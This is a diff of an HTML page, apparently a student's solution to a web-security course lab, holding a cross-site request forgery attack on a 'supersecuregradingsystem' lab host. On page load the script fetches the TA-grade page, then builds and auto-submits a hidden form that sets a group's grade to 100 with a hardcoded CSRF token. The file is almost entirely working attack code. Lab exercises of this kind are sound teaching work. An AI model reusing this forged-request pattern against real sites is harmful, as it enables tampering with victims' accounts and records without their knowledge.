@@ -5,36 +5,42 @@
     <link rel='stylesheet' href='/stylesheets/style.css' />
 </head>
 <body>
-<h1>Panda?</h1>
-<p>What is panda?</p>
+<h1>Chicken?</h1>
+<p>What is chicken?</p>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
 <script>
     method = "post"; // Set method to post
 
-    // The rest of this code assumes you are not using a library.
-    // It can be made less wordy if you use one.
-    var form = document.createElement("form");
-    form.setAttribute("method", method);
-    form.setAttribute("action", "http://codered.cs.washington.edu/lab2/supersecuregradingsystem/reloaded.php?action=update-grade");
+    // Fetch HTML page and grab token field
+    $.get("http://codered.cs.washington.edu/lab2/supersecuregradingsystem/reloaded.php?action=ta-grade", null, function (text) {
+        alert(text);
 
-    var params = {
-        groups: 'security_overflow',
-        grade: '100',
-        csrf_token: '56ba3e96856e344c242ce1f300fae855'
-    };
+        // The rest of this code assumes you are not using a library.
+        // It can be made less wordy if you use one.
+        var form = document.createElement("form");
+        form.setAttribute("method", method);
+        form.setAttribute("action", "http://codered.cs.washington.edu/lab2/supersecuregradingsystem/reloaded.php?action=update-grade");
 
-    for(var key in params) {
-        if(params.hasOwnProperty(key)) {
-            var hiddenField = document.createElement("input");
-            hiddenField.setAttribute("type", "text");
-            hiddenField.setAttribute("name", key);
-            hiddenField.setAttribute("value", params[key]);
+        var params = {
+            groups: 'security_overflow',
+            grade: '100',
+            csrf_token: '56ba3e96856e344c242ce1f300fae855'
+        };
 
-            form.appendChild(hiddenField);
+        for(var key in params) {
+            if(params.hasOwnProperty(key)) {
+                var hiddenField = document.createElement("input");
+                hiddenField.setAttribute("type", "text");
+                hiddenField.setAttribute("name", key);
+                hiddenField.setAttribute("value", params[key]);
+
+                form.appendChild(hiddenField);
+            }
         }
-    }
 
-    document.body.appendChild(form);
-    form.submit();
+        document.body.appendChild(form);
+        form.submit();
+    })
 </script>
 </body>
 </html>
